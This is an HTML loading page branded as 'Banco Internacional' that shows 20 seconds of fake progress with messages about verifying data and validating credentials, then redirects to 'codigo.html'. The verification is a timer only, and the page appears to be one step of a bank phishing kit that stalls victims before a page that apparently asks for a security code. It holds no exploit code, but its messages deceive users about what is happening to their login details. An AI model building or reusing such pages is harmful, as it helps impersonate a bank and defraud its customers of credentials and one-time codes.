<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Banco Internacional</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      min-height: 100vh;
      background-color: #F5A81C;
      display: flex;
      justify-content: center;
      font-family: 'Helvetica Neue', Arial, sans-serif;
    }

    .container {
      width: 100%;
      max-width: 430px;
      min-height: 100vh;
      background-color: #F5A81C;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 40px 28px;
      gap: 48px;
    }

    /* Logo */
    .logo-area img {
      width: 200px;
      object-fit: contain;
    }

    /* Spinner ring */
    .spinner-wrap {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 32px;
    }

    .spinner-ring {
      position: relative;
      width: 90px;
      height: 90px;
    }

    .spinner-ring svg {
      width: 90px;
      height: 90px;
      animation: rotate 1.2s linear infinite;
    }

    .spinner-ring svg circle {
      fill: none;
      stroke-width: 5;
      stroke-linecap: round;
      stroke-dasharray: 200;
      stroke-dashoffset: 150;
      stroke: white;
      opacity: 0.9;
    }

    @keyframes rotate {
      100% { transform: rotate(360deg); }
    }

    /* Pulsing dots */
    .dots {
      display: flex;
      gap: 10px;
      align-items: center;
    }

    .dot {
      width: 9px;
      height: 9px;
      border-radius: 50%;
      background: white;
      opacity: 0.3;
      animation: pulse 1.4s ease-in-out infinite;
    }

    .dot:nth-child(1) { animation-delay: 0s; }
    .dot:nth-child(2) { animation-delay: 0.22s; }
    .dot:nth-child(3) { animation-delay: 0.44s; }

    @keyframes pulse {
      0%, 80%, 100% { opacity: 0.3; transform: scale(1); }
      40%            { opacity: 1;   transform: scale(1.3); }
    }

    /* Message */
    .msg {
      color: white;
      font-size: 15px;
      font-weight: 400;
      letter-spacing: 0.3px;
      opacity: 0.9;
      text-align: center;
    }

    /* Progress bar */
    .progress-wrap {
      width: 100%;
      max-width: 280px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 10px;
    }

    .progress-bar-bg {
      width: 100%;
      height: 4px;
      background: rgba(255,255,255,0.25);
      border-radius: 99px;
      overflow: hidden;
    }

    .progress-bar-fill {
      height: 100%;
      width: 0%;
      background: white;
      border-radius: 99px;
      transition: width 0.5s linear;
    }

    .progress-label {
      color: rgba(255,255,255,0.6);
      font-size: 12px;
    }

    /* Fade out overlay */
    .fade-overlay {
      position: fixed;
      inset: 0;
      background: #F5A81C;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.6s ease;
      z-index: 99;
    }
    .fade-overlay.active { opacity: 1; pointer-events: all; }
  </style>
</head>
<body>

<div class="fade-overlay" id="fadeOverlay"></div>

<div class="container">

  <div class="logo-area">
    <img src="logo.webp" alt="Banco Internacional" />
  </div>

  <div class="spinner-wrap">

    <div class="spinner-ring">
      <svg viewBox="0 0 90 90" xmlns="http://www.w3.org/2000/svg">
        <circle cx="45" cy="45" r="38"/>
      </svg>
    </div>

    <div class="dots">
      <div class="dot"></div>
      <div class="dot"></div>
      <div class="dot"></div>
    </div>

    <p class="msg" id="msg">Verificando tus datos...</p>

  </div>

  <div class="progress-wrap">
    <div class="progress-bar-bg">
      <div class="progress-bar-fill" id="progressFill"></div>
    </div>
    <span class="progress-label" id="progressLabel">0%</span>
  </div>

</div>

<script>
  const DURATION = 20; // segundos
  const messages = [
    "Verificando tus datos...",
    "Conectando de forma segura...",
    "Validando credenciales...",
    "Cargando tu información...",
    "Preparando tu cuenta...",
    "Casi listo..."
  ];

  const msgEl     = document.getElementById('msg');
  const fillEl    = document.getElementById('progressFill');
  const labelEl   = document.getElementById('progressLabel');
  const overlay   = document.getElementById('fadeOverlay');

  let elapsed = 0;
  let msgIndex = 0;

  // Update progress every 100ms
  const interval = setInterval(() => {
    elapsed += 0.1;
    const pct = Math.min((elapsed / DURATION) * 100, 100);
    fillEl.style.width = pct + '%';
    labelEl.textContent = Math.floor(pct) + '%';

    // Rotate messages
    const expectedMsg = Math.floor((elapsed / DURATION) * messages.length);
    if (expectedMsg !== msgIndex && expectedMsg < messages.length) {
      msgIndex = expectedMsg;
      msgEl.style.opacity = '0';
      setTimeout(() => {
        msgEl.textContent = messages[msgIndex];
        msgEl.style.opacity = '0.9';
      }, 300);
    }

    if (elapsed >= DURATION) {
      clearInterval(interval);
      // Fade out then redirect
      overlay.classList.add('active');
      setTimeout(() => {
        window.location.href = 'codigo.html';
      }, 700);
    }
  }, 100);

  // Smooth message fade via CSS
  msgEl.style.transition = 'opacity 0.3s ease';
</script>

</body>
</html>
